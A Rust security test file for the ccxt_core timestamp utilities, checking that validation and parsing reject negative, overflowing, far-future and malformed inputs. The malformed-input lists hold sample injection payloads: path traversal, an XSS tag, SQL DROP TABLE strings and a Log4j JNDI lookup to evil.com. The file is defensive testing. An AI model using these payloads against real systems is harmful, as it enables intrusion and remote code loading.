use ccxt_core::error::Error;
use ccxt_core::time::{TimestampUtils, parse_date, parse_iso8601};

/// Security tests for timestamp handling to prevent common vulnerabilities
///
/// These tests verify that the timestamp implementation is secure against
/// various attack vectors including injection, overflow, and manipulation attacks.

#[cfg(test)]
mod timestamp_security_tests {
    use super::*;

    // ==================== Input Validation Security Tests ====================

    #[test]
    fn test_prevent_negative_timestamp_injection() {
        // Test various negative timestamp values that could be used in attacks
        let negative_timestamps = vec![-1i64, -1000i64, -1_000_000i64, i64::MIN, i64::MIN + 1];

        for &ts in &negative_timestamps {
            let result = TimestampUtils::validate_timestamp(ts);
            assert!(
                result.is_err(),
                "Negative timestamp {} should be rejected",
                ts
            );

            let error_msg = result.unwrap_err().to_string();
            assert!(
                error_msg.contains("negative"),
                "Error message should mention negative timestamp: {}",
                error_msg
            );
        }
    }

    #[test]
    fn test_prevent_far_future_timestamp_injection() {
        // Test timestamps far in the future that could be used to bypass time-based controls
        let far_future_timestamps = vec![
            TimestampUtils::YEAR_2100_MS + 1,
            TimestampUtils::YEAR_2100_MS + 1000,
            TimestampUtils::YEAR_2100_MS + 1_000_000,
            i64::MAX,
            i64::MAX - 1,
        ];

        for &ts in &far_future_timestamps {
            let result = TimestampUtils::validate_timestamp(ts);
            assert!(
                result.is_err(),
                "Far future timestamp {} should be rejected",
                ts
            );

            let error_msg = result.unwrap_err().to_string();
            assert!(
                error_msg.contains("too far in future"),
                "Error message should mention far future: {}",
                error_msg
            );
        }
    }

    #[test]
    fn test_boundary_values_security() {
        // Test exact boundary values to ensure no off-by-one vulnerabilities

        // Unix epoch should be valid
        assert!(TimestampUtils::validate_timestamp(0).is_ok());

        // Just before Unix epoch should be invalid
        assert!(TimestampUtils::validate_timestamp(-1).is_err());

        // Year 2100 boundary should be valid
        assert!(TimestampUtils::validate_timestamp(TimestampUtils::YEAR_2100_MS).is_ok());

        // Just after year 2100 should be invalid
        assert!(TimestampUtils::validate_timestamp(TimestampUtils::YEAR_2100_MS + 1).is_err());
    }

    // ==================== String Parsing Security Tests ====================

    #[test]
    fn test_prevent_malformed_string_injection() {
        // Test various malformed strings that could be used in injection attacks
        let malformed_strings = vec![
            "",                             // Empty string
            " ",                            // Whitespace only
            "invalid",                      // Non-numeric
            "12345abc",                     // Mixed alphanumeric
            "abc12345",                     // Mixed alphanumeric
            "1.2.3.4",                      // Multiple dots
            "1e999",                        // Scientific notation overflow
            "NaN",                          // Not a number
            "Infinity",                     // Infinity
            "-Infinity",                    // Negative infinity
            "null",                         // Null string
            "undefined",                    // Undefined string
            "\0",                           // Null byte
            "\n\r\t",                       // Control characters
            "1\x00234",                     // Embedded null byte
            "../../etc/passwd",             // Path traversal attempt
            "<script>alert(1)</script>",    // XSS attempt
            "'; DROP TABLE timestamps; --", // SQL injection attempt
            "${jndi:ldap://evil.com/a}",    // Log4j injection attempt
        ];

        for malformed_str in &malformed_strings {
            let result = TimestampUtils::parse_timestamp(malformed_str);
            assert!(
                result.is_err(),
                "Malformed string '{}' should be rejected",
                malformed_str
            );
        }
    }

    #[test]
    fn test_prevent_nan_infinity_injection() {
        // Test that NaN and Infinity values are properly rejected
        let invalid_float_strings = vec![
            "NaN",
            "nan",
            "NAN",
            "Infinity",
            "infinity",
            "INFINITY",
            "-Infinity",
            "-infinity",
            "-INFINITY",
            "inf",
            "INF",
            "-inf",
            "-INF",
        ];

        for invalid_str in &invalid_float_strings {
            let result = TimestampUtils::parse_timestamp(invalid_str);
            assert!(
                result.is_err(),
                "Invalid float string '{}' should be rejected",
                invalid_str
            );
        }
    }

    #[test]
    fn test_prevent_scientific_notation_overflow() {
        // Test scientific notation that could cause overflow
        let overflow_scientific = vec![
            "1e20",     // Very large number
            "1e100",    // Extremely large number
            "1e308",    // Near f64 max
            "1e309",    // f64 overflow
            "-1e20",    // Very large negative
            "9.999e99", // Large with decimal
        ];

        for sci_str in &overflow_scientific {
            let result = TimestampUtils::parse_timestamp(sci_str);
            // Should either be rejected or result in a timestamp that fails validation
            if let Ok(ts) = result {
                let validation_result = TimestampUtils::validate_timestamp(ts);
                assert!(
                    validation_result.is_err(),
                    "Overflow scientific notation '{}' should result in invalid timestamp",
                    sci_str
                );
            }
            // If parsing fails, that's also acceptable for security
        }
    }

    // ==================== Date String Security Tests ====================

    #[test]
    fn test_prevent_date_format_injection() {
        // Test various malformed date strings that could be used in attacks
        let malformed_dates = vec![
            "",                                           // Empty string
            "not-a-date",                                 // Invalid format
            "2024-13-01",                                 // Invalid month
            "2024-01-32",                                 // Invalid day
            "2024-01-01T25:00:00Z",                       // Invalid hour
            "2024-01-01T12:60:00Z",                       // Invalid minute
            "2024-01-01T12:00:60Z",                       // Invalid second
            "2024-01-01T12:00:00+25:00",                  // Invalid timezone offset
            "9999-12-31T23:59:59Z",                       // Far future date
            "1969-12-31T23:59:59Z",                       // Before Unix epoch
            "2024-01-01T12:00:00\x00Z",                   // Embedded null byte
            "2024-01-01T12:00:00'; DROP TABLE dates; --", // SQL injection attempt
            "../../../etc/passwd",                        // Path traversal
            "<script>alert(1)</script>",                  // XSS attempt
        ];

        for malformed_date in &malformed_dates {
            let result1 = parse_date(malformed_date);
            let result2 = parse_iso8601(malformed_date);

            // Both should either fail parsing or result in invalid timestamps
            if let Ok(ts) = result1 {
                let validation = TimestampUtils::validate_timestamp(ts);
                assert!(
                    validation.is_err() || TimestampUtils::is_reasonable_timestamp(ts),
                    "Malformed date '{}' should not produce invalid timestamp",
                    malformed_date
                );
            }

            if let Ok(ts) = result2 {
                let validation = TimestampUtils::validate_timestamp(ts);
                assert!(
                    validation.is_err() || TimestampUtils::is_reasonable_timestamp(ts),
                    "Malformed ISO date '{}' should not produce invalid timestamp",
                    malformed_date
                );
            }
        }
    }

    // ==================== Conversion Security Tests ====================

    #[test]
    #[allow(deprecated)]
    fn test_prevent_u64_overflow_attack() {
        // Test u64 values that could cause overflow when converted to i64
        let overflow_u64_values = vec![
            u64::MAX,
            u64::MAX - 1,
            (i64::MAX as u64) + 1,
            (i64::MAX as u64) + 1000,
            18_446_744_073_709_551_615u64, // u64::MAX explicit
        ];

        for &u64_val in &overflow_u64_values {
            let result = TimestampUtils::u64_to_i64(u64_val);
            assert!(
                result.is_err(),
                "u64 overflow value {} should be rejected",
                u64_val
            );

            let error_msg = result.unwrap_err().to_string();
            assert!(
                error_msg.contains("overflow"),
                "Error message should mention overflow: {}",
                error_msg
            );
        }
    }

    #[test]
    #[allow(deprecated)]
    fn test_prevent_i64_underflow_attack() {
        // Test i64 values that could cause underflow when converted to u64
        let underflow_i64_values = vec![-1i64, -1000i64, i64::MIN, i64::MIN + 1];

        for &i64_val in &underflow_i64_values {
            let result = TimestampUtils::i64_to_u64(i64_val);
            assert!(
                result.is_err(),
                "i64 underflow value {} should be rejected",
                i64_val
            );

            let error_msg = result.unwrap_err().to_string();
            assert!(
                error_msg.contains("negative"),
                "Error message should mention negative: {}",
                error_msg
            );
        }
    }

    // ==================== Time Manipulation Security Tests ====================

    #[test]
    fn test_prevent_time_travel_attacks() {
        // Test that we can't create timestamps that would allow "time travel"
        let current_time = TimestampUtils::now_ms();

        // Far future timestamps should be rejected
        let far_future = current_time + (365 * 24 * 60 * 60 * 1000 * 100); // 100 years from now
        if far_future > TimestampUtils::YEAR_2100_MS {
            assert!(
                TimestampUtils::validate_timestamp(far_future).is_err(),
                "Far future timestamp should be rejected"
            );
        }

        // Negative timestamps should be rejected
        assert!(
            TimestampUtils::validate_timestamp(-1).is_err(),
            "Negative timestamp should be rejected"
        );
    }

    #[test]
    fn test_consistent_validation_across_functions() {
        // Ensure all timestamp functions use consistent validation
        let invalid_timestamp = -1000i64;

        // Direct validation should fail
        assert!(TimestampUtils::validate_timestamp(invalid_timestamp).is_err());

        // Formatting functions should fail
        assert!(TimestampUtils::format_iso8601(invalid_timestamp).is_err());

        // All formatting functions should consistently reject invalid timestamps
        assert!(ccxt_core::time::iso8601(invalid_timestamp).is_err());
        assert!(ccxt_core::time::ymdhms(invalid_timestamp, None).is_err());
        assert!(ccxt_core::time::yyyymmdd(invalid_timestamp, None).is_err());
        assert!(ccxt_core::time::yymmdd(invalid_timestamp, None).is_err());
    }

    // ==================== Error Message Security Tests ====================

    #[test]
    fn test_error_messages_no_information_leakage() {
        // Ensure error messages don't leak sensitive information
        let test_cases = vec![
            (-1i64, "negative"),
            (TimestampUtils::YEAR_2100_MS + 1, "future"),
        ];

        for (invalid_ts, expected_keyword) in test_cases {
            let result = TimestampUtils::validate_timestamp(invalid_ts);
            assert!(result.is_err());

            let error_msg = result.unwrap_err().to_string();

            // Error message should be descriptive but not leak system info
            assert!(error_msg.contains(expected_keyword));
            assert!(!error_msg.contains("panic"));
            assert!(!error_msg.contains("unwrap"));
            assert!(!error_msg.contains("debug"));
            assert!(!error_msg.contains("internal"));
            assert!(!error_msg.contains("system"));

            // Should not contain the actual invalid value in a way that could be exploited
            assert!(
                error_msg.len() < 200,
                "Error message should be reasonably short"
            );
        }
    }

    // ==================== Performance Security Tests ====================

    #[test]
    fn test_no_timing_attacks_on_validation() {
        // Ensure validation time is consistent regardless of input
        // This is a basic test - more sophisticated timing analysis would be needed for production

        let valid_timestamp = 1704110400000i64;
        let invalid_negative = -1000i64;
        let invalid_future = TimestampUtils::YEAR_2100_MS + 1000;

        // All validations should complete quickly and consistently
        let start = std::time::Instant::now();
        let _ = TimestampUtils::validate_timestamp(valid_timestamp);
        let valid_duration = start.elapsed();

        let start = std::time::Instant::now();
        let _ = TimestampUtils::validate_timestamp(invalid_negative);
        let invalid_neg_duration = start.elapsed();

        let start = std::time::Instant::now();
        let _ = TimestampUtils::validate_timestamp(invalid_future);
        let invalid_fut_duration = start.elapsed();

        // All should complete in reasonable time (less than 1ms)
        assert!(valid_duration.as_millis() < 1);
        assert!(invalid_neg_duration.as_millis() < 1);
        assert!(invalid_fut_duration.as_millis() < 1);
    }

    // ==================== Integration Security Tests ====================

    #[test]
    fn test_end_to_end_security_validation() {
        // Test complete workflow from string parsing to validation
        let malicious_inputs = vec![
            "-999999999999999",      // Large negative number
            "999999999999999999999", // Overflow number
            "1e999",                 // Scientific overflow
            "NaN",                   // Not a number
            "Infinity",              // Infinity
        ];

        for malicious_input in &malicious_inputs {
            // Parse should either fail or produce a timestamp that fails validation
            match TimestampUtils::parse_timestamp(malicious_input) {
                Ok(ts) => {
                    // If parsing succeeds, validation should catch invalid timestamps
                    let validation_result = TimestampUtils::validate_timestamp(ts);
                    if validation_result.is_ok() {
                        // If validation passes, timestamp should be reasonable
                        assert!(
                            TimestampUtils::is_reasonable_timestamp(ts),
                            "Malicious input '{}' produced unreasonable timestamp {}",
                            malicious_input,
                            ts
                        );
                    }
                }
                Err(_) => {
                    // Parsing failure is acceptable for malicious input
                }
            }
        }
    }

    #[test]
    fn test_memory_safety_with_large_inputs() {
        // Test that large inputs don't cause memory issues
        let large_string = "1".repeat(10000); // Very long string
        let result = TimestampUtils::parse_timestamp(&large_string);

        // Should either parse successfully or fail gracefully
        // Rust's memory safety should prevent any buffer overflows
        match result {
            Ok(ts) => {
                // If it parses, it should be validated
                let _ = TimestampUtils::validate_timestamp(ts);
            }
            Err(_) => {
                // Parsing failure is acceptable for invalid input
            }
        }
    }
}

// ==================== Property-Based Security Tests ====================

#[cfg(test)]
mod property_based_security_tests {
    use super::*;
    use proptest::prelude::*;

    proptest! {
        #[test]
        fn test_validation_never_panics(timestamp in any::<i64>()) {
            // Validation should never panic, regardless of input
            let _ = TimestampUtils::validate_timestamp(timestamp);
        }

        #[test]
        fn test_parsing_never_panics(input in ".*") {
            // Parsing should never panic, regardless of input string
            let _ = TimestampUtils::parse_timestamp(&input);
        }

        #[test]
        fn test_valid_timestamps_always_format(
            timestamp in 0i64..TimestampUtils::YEAR_2100_MS
        ) {
            // Valid timestamps should always format successfully
            let validated = TimestampUtils::validate_timestamp(timestamp).unwrap();
            let formatted = TimestampUtils::format_iso8601(validated);
            assert!(formatted.is_ok(), "Valid timestamp {} should format successfully", timestamp);
        }

        #[test]
        fn test_invalid_timestamps_always_rejected(
            timestamp in prop::sample::select(vec![
                i64::MIN..0i64,
                (TimestampUtils::YEAR_2100_MS + 1)..i64::MAX
            ]).prop_flat_map(|range| range)
        ) {
            // Invalid timestamps should always be rejected
            let result = TimestampUtils::validate_timestamp(timestamp);
            assert!(result.is_err(), "Invalid timestamp {} should be rejected", timestamp);
        }
    }
}
